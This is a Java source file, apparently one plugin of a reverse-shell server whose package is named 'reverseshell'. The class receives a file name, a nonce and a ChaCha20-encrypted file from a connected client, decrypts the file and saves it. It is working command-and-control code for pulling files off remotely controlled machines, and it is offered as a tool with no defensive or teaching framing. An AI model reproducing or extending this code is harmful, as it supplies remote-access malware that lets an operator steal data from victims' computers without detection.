package obs1d1anc1ph3r.reverseshell.server.plugins.reactive;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.net.Socket;
import obs1d1anc1ph3r.reverseshell.server.encryption.ChaCha20Server;
import obs1d1anc1ph3r.reverseshell.server.plugins.reactive.utils.FileSaver;
import obs1d1anc1ph3r.reverseshell.server.plugins.reactive.utils.ReactiveCommandPlugin;

public class DownloadServerCommand implements ReactiveCommandPlugin {

	private final FileSaver fileSaver = new FileSaver();

	@Override
	public void execute(DataInputStream dataIn, DataOutputStream dataOut, byte[] encryptionKey, Socket clientSocket) throws Exception {
		String fileName = dataIn.readUTF(); //File name
		int nonceLength = dataIn.readInt(); //Nonce length

		if (nonceLength <= 0 || nonceLength > 32) {
			throw new Exception("Invalid nonce length: " + nonceLength); //Bad length
		}
		byte[] receivedNonce = new byte[nonceLength]; //Get nonce
		dataIn.readFully(receivedNonce); //Do the thing

		int fileLength = dataIn.readInt(); //Get data size
		if (fileLength <= 0) {
			throw new Exception("Invalid file length received: " + fileLength);
		}

		byte[] encryptedFileBytes = new byte[fileLength]; //Make a byte array the size of the received stuff
		dataIn.readFully(encryptedFileBytes); //Read the encrypted bytes

		byte[] fileBytes = ChaCha20Server.decrypt(encryptionKey, receivedNonce, encryptedFileBytes); //Decrypt it

		fileSaver.saveFile(fileBytes, clientSocket, fileName); //I don't wanna deal with this anymore
	}
}
